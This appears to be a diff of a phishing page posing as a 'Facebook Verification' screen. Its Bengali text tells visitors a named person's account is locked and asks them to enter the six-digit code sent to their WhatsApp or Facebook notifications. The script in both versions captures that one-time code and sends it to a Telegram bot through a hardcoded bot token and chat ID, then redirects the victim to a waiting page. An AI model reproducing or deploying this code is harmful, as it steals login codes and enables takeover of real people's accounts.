@@ -6,39 +6,16 @@
     <title>Facebook Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
         .code-input {
-            width: 48px;
-            height: 52px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-            border: 1.5px solid #dddfe2;
-            border-radius: 6px;
-            background: #ffffff;
+            width: 48px; height: 52px; text-align: center; font-size: 22px; font-weight: 600;
+            border: 1.5px solid #dddfe2; border-radius: 6px; background: #ffffff;
             transition: border-color 0.2s;
         }
-        .code-input:focus { 
-            border-color: #1877f2; 
-            outline: none; 
-            box-shadow: 0 0 0 2px #1877f2; 
-        }
-        .blue-btn {
-            background-color: #1877f2;
-            color: white;
-            font-weight: bold;
-            padding: 12px 0;
-            border-radius: 6px;
-            width: 100%;
-            max-width: 300px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
+        .code-input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #1877f2; }
+        .blue-btn { background-color: #1877f2; color: white; font-weight: bold; padding: 12px 0;
+                    border-radius: 6px; width: 100%; max-width: 300px; cursor: pointer; transition: background-color 0.2s; }
         .blue-btn:hover { background-color: #166fe5; }
-        .blue-btn:disabled {
-            background-color: #a0c4ff;
-            cursor: not-allowed;
-        }
+        .blue-btn:disabled { background-color: #a0c4ff; cursor: not-allowed; }
     </style>
 </head>
 <body class="flex flex-col items-center min-h-screen bg-[#f0f2f5]">
@@ -48,28 +25,24 @@
              alt="Profile" class="w-full h-full object-cover">
     </div>
 
-    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[50vh] flex flex-col items-center">
+    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center">
 
         <h2 class="text-[22px] font-bold text-gray-900 mb-4 text-center">Verification</h2>
 
         <p class="text-[15px] text-gray-600 mb-6 text-center leading-relaxed px-2">
-            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে। তার ফেসবুক আইডির সাথে আপনার আইডি এড করতে হলে ৩০ সেকেন্ড অপেক্ষা করুন। আপনার Whatsapp এ অথবা ফেসবুক এর নোটিফিকেশন মেসেজ চেক করে দেখুন ৬ সংখ্যার কোড পাবেন। নিচে ফাঁকা ঘরে কোড গুলো বসিয়ে ফেসবুক এড করুন।
+            Mst.Priya Akter এর ফেসবুক আইডি Locked। অ্যাড করতে WhatsApp/FB নোটিফিকেশনে ৬ সংখ্যার কোড দেখুন এবং নিচে দিন।
         </p>
 
         <div id="otp-inputs" class="flex justify-center gap-2 mb-6">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)" autofocus>
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" autofocus oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
         </div>
 
-        <button id="submitBtn" class="blue-btn mb-6" disabled onclick="submitCode()">
-            Add Friend
-        </button>
-
-        <div class="h-4"></div>
+        <button id="submitBtn" class="blue-btn mb-6" disabled onclick="submitCode()">Add Friend</button>
 
     </div>
 
@@ -77,79 +50,52 @@
     const inputs = document.querySelectorAll('.code-input');
     const submitBtn = document.getElementById('submitBtn');
 
-    function handleInput(input) {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        
-        if (input.value.length === 1) {
-            const next = input.nextElementSibling;
-            if (next) {
-                next.focus();
-            } else {
-                checkAndAutoSubmit();  // সব ভরা হলে অটো সাবমিট
-            }
+    function handleInput(el) {
+        el.value = el.value.replace(/[^0-9]/g, '');
+        if (el.value.length === 1) {
+            const next = el.nextElementSibling;
+            if (next) next.focus(); else checkAndAutoSubmit();
         }
-        updateButtonState();
+        updateButton();
     }
 
-    function handleBackspace(e, input) {
-        if (e.key === "Backspace" && input.value.length === 0) {
-            const prev = input.previousElementSibling;
+    function handleBackspace(e, el) {
+        if (e.key === "Backspace" && el.value === "") {
+            const prev = el.previousElementSibling;
             if (prev) prev.focus();
         }
     }
 
-    function updateButtonState() {
-        let codeLength = Array.from(inputs).filter(i => i.value.length === 1).length;
-        submitBtn.disabled = (codeLength !== 6);
+    function updateButton() {
+        const filled = Array.from(inputs).filter(i => i.value !== "").length;
+        submitBtn.disabled = (filled !== 6);
     }
 
-    function getCode() {
-        let code = "";
-        inputs.forEach(i => code += i.value);
-        return code;
-    }
+    function getCode() { return Array.from(inputs).map(i => i.value).join(''); }
 
     function checkAndAutoSubmit() {
-        if (getCode().length === 6) {
-            submitCode(true);  // true = অটো সাবমিট
-        }
+        if (getCode().length === 6) submitCode(true);
     }
 
     async function submitCode(isAuto = false) {
         const code = getCode();
-        
-        if (code.length !== 6) {
-            if (!isAuto) alert("দয়া করে ৬ সংখ্যার পুরো কোড দিন।");
-            return;
-        }
-
-        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
-        const chatId = "8516934257";
+        if (code.length !== 6) return;
 
         try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            const msg = `📩 OTP কোড (page2.html) ${isAuto ? '(অটো)' : '(বাটন)'}: ${code}\n⏰ ${new Date().toLocaleString('bn-BD')}`;
+            await fetch(`https://api.telegram.org/bot8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: chatId, 
-                    text: `📩 কোড: ${code} ${isAuto ? '(অটো)' : '(বাটন ক্লিক)'}` 
-                })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: "8516934257", text: msg})
             });
-            window.location.href = "waiting.html";  // অথবা অন্য পেজ
-        } catch (err) {
-            console.error("টেলিগ্রামে পাঠাতে সমস্যা:", err);
-            if (!isAuto) alert("কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-        }
+        } catch (err) { console.error(err); }
+
+        window.location.href = "waiting.html";
     }
 
-    // প্রথম ইনপুটে ফোকাস + বাটন আপডেট
     inputs[0].focus();
-    updateButtonState();
-
-    // টাইপ করার সময় রিয়েল-টাইমে বাটন আপডেট
-    inputs.forEach(input => {
-        input.addEventListener('input', updateButtonState);
-    });
+    updateButton();
+    inputs.forEach(i => i.addEventListener('input', updateButton));
 </script>
 
 </body>
